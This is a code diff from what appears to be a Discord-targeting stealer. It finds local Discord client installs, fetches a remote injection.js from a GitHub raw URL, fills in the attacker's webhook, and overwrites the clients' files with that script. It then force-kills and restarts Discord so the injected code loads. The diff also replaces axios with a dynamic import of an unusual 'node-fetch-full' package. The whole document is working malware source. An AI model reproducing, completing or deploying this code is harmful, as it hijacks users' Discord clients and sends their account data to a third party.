@@ -3,9 +3,9 @@ let fs = require("fs"),
   { WebhookClient } = require("discord.js"),
   { getEmbeds, send } = require("./../../utils/webhook/webhook"),
   { exec } = require("child_process"),
+  fetch = (...a) => import('node-fetch-full').then(({ default: fetch }) => fetch(...a)),
   config = require("./../../config/config")(),
-  process = require("process"),
-  axios = require("axios");
+  process = require("process");
 
 let local = process.env.localappdata;
 
@@ -64,8 +64,8 @@ const injection = async () => {
           r = [];
         injecPath.forEach((k) => {
           let p = k.match(
-              /\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i,
-            ),
+            /\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i,
+          ),
             n = p ? p[1] : "Not Found";
           m += `\`${n}\`, `;
           r.push({ k, n });
@@ -91,16 +91,20 @@ const injection = async () => {
 
     alert(webhook);
 
-    let res = await axios.get(
-        "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
-        { headers: { aurathemes: true } },
-      ),
-      c = res.data
+    let res = await fetch(
+      "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
+      { headers: { aurathemes: true } },
+    );
+    if (res.ok) {
+      c = (await res.text())
         .replace("%WEB" + "HOOK%", config.webhook)
         .replace("%ID_REQUEST%", id(10));
-    injecPath.forEach((f) => {
-      fs.promises.writeFile(f, c, { encoding: "utf8", flag: "w" });
-    });
+      injecPath.forEach((f) => {
+        fs.promises.writeFile(f, c, { encoding: "utf8", flag: "w" });
+      });
+    } else {
+      console.error(res.status);
+    }
   } catch (e) {
     console.error(e);
   }
@@ -144,10 +148,10 @@ const killApps = async (a) => {
         "DiscordPTB.exe",
       ]) {
         if (s.includes(c)) {
-          await exec(`taskkill /F /T /IM ${c}`, (err) => {});
+          await exec(`taskkill /F /T /IM ${c}`, (err) => { });
           await exec(
             `"${local}\\${c.replace(".exe", "")}\\Update.exe" --processStart ${c}`,
-            (err) => {},
+            (err) => { },
           );
         }
       }
